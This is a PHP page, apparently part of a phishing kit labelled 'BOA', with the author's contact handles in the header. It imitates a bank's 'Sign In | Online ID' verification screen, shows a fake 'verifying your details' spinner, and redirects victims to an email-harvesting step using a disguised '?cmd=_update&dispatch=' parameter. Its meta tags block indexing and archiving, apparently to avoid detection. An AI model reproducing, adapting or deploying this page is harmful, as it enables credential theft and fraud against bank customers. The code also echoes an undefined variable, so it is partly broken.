<?php

/**
 * @link              https://www.z0n51.com/
 * @since             06/11/2019
 * @package           BOA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Sign In | Online ID</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <img src="../assets/images/logo.png">
                    </div>
                    <div class="col text-right d-lg-block d-md-block d-sm-none d-none">
                        <img src="../assets/images/header-right.png">
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <img src="../assets/images/verify.png">
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container text-center">
                <div class="loaderrr">
                    <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                    <p class="mb-0 mt-4">Verifying the details that you entered ...</p>
                    <p>You will be redirected to next page when were done verifying your details</p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->


        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dis = "<?php echo "?cmd=_update&dispatch=" . $hello; ?>";
            setTimeout(function () {
                window.location.href= 'email.php' + dis;
            },3000);
        </script>

    </body>

</html>